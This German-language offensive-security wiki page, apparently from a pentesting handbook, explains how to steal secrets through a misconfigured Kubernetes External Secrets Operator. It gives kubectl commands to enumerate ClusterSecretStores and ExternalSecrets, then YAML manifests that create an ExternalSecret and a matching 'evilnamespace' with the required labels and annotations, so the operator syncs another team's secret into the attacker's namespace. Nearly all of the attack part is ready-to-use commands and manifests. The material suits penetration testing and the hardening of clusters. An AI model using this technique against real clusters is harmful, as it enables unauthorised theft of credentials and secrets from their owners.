# External Secret Operator

**Der ursprüngliche Autor dieser Seite ist** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Diese Seite gibt einige Hinweise, wie Sie Geheimnisse von einem falsch konfigurierten ESO oder einer Anwendung stehlen können, die ESO verwendet, um ihre Geheimnisse zu synchronisieren.

## Disclaimer

Die unten gezeigte Technik kann nur funktionieren, wenn bestimmte Umstände erfüllt sind. Zum Beispiel hängt es von den Anforderungen ab, die erforderlich sind, um ein Geheimnis in einem Namespace zu synchronisieren, den Sie besitzen / kompromittiert haben. Sie müssen es selbst herausfinden.

## Voraussetzungen

1. Ein Fuß in einem Kubernetes / OpenShift-Cluster mit Administratorrechten in einem Namespace
2. Lesezugriff auf mindestens ExternalSecret auf Cluster-Ebene
3. Herausfinden, ob erforderliche Labels / Annotationen oder Gruppenmitgliedschaften benötigt werden, die ESO erlauben, Ihr Geheimnis zu synchronisieren. Wenn Sie Glück haben, können Sie beliebige definierte Geheimnisse frei stehlen.

### Informationen über vorhandene ClusterSecretStore sammeln

Vorausgesetzt, Sie haben einen Benutzer, der genügend Rechte hat, um diese Ressource zu lesen; beginnen Sie damit, zuerst die vorhandenen _**ClusterSecretStores**_ aufzulisten.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret Aufzählung

Angenommen, Sie haben einen ClusterSecretStore mit dem Namen _**mystore**_ gefunden. Fahren Sie fort, indem Sie die zugehörigen externalsecret auflisten.
```sh
kubectl get externalsecret -A | grep mystore
```
_Diese Ressource ist namespaced, also füge die -A-Option hinzu, um in allen Namespaces zu suchen, es sei denn, du weißt bereits, nach welchem Namespace du suchen sollst._

Du solltest eine Liste der definierten externalsecret erhalten. Angenommen, du hast ein externalsecret-Objekt namens _**mysecret**_ gefunden, das im Namespace _**mynamespace**_ definiert und verwendet wird. Sammle ein wenig mehr Informationen darüber, welche Art von Geheimnis es enthält.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Assembling the pieces

Von hier aus können Sie den Namen eines oder mehrerer Geheimnisse (wie im Secret-Ressource definiert) erhalten. Sie erhalten eine Ausgabe ähnlich wie:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Bisher haben wir:

- Name eines ClusterSecretStore
- Name eines ExternalSecret
- Name des Secrets

Jetzt, da wir alles haben, was wir brauchen, können Sie ein ExternalSecret erstellen (und gegebenenfalls einen neuen Namespace patchen/erstellen, um die Voraussetzungen zu erfüllen, die erforderlich sind, um Ihr neues Secret synchronisiert zu bekommen):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Nach ein paar Minuten, wenn die Synchronisationsbedingungen erfüllt sind, sollten Sie in der Lage sein, das geleakte Geheimnis in Ihrem Namespace zu sehen.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referenzen

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
